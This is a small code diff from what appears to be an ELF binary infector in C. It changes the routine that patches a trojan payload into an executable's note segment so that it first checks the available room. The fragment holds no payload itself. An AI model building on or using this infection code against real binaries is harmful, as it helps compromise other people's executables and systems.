@@ -84,7 +84,8 @@ static bool doit(const char *binfile, const char *trojan) {
 
         infect_t *inf = inf_load(elfo, m1, magic, &src_map);
 
-        if (inf_note_patch(inf))
+        elf_xword_t max = inf_note_has_room_for_payload(inf);
+        if (inf_note_patch(inf, max))
             printf("Done!\nTry running %s\n", file);
 
         free(inf->trojan);
